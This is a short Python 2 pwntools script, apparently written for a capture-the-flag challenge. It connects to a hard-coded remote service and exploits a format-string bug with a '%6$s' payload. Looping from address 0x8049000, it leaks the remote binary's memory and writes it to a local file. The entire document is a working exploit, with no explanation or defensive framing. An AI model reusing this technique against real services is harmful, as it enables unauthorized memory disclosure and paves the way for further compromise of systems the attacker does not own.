# encoding: utf-8

from pwn import *
import binascii


file = open('output', 'wb+')

address = 0x8049000
leak = ''
lock = False
while True:
	try:
		r = remote("206.81.24.129", 1337)
		print "address @ ", hex(address)
		payload = '%6$sABCD'
		if '\x0a' in p32(address):
			file.write('\xff')
			leak += '\xff'
			address += 1
			continue

		r.sendlineafter(':', payload)
		r.sendlineafter(':', '00'+p32(address))

		info = r.recvuntil('ABCD')[:-4]
		if lock:
			r.recvline()
		print "info = ", binascii.hexlify(info)
		print "len = ", len(info)
		file.write(info + '\x00')
		address += len(info) + 1
		leak += info + '\x00'
		print hexdump(leak)
		lock = True
		r.close()
		
	except:
		r.close()
		break

file.close()
r.close()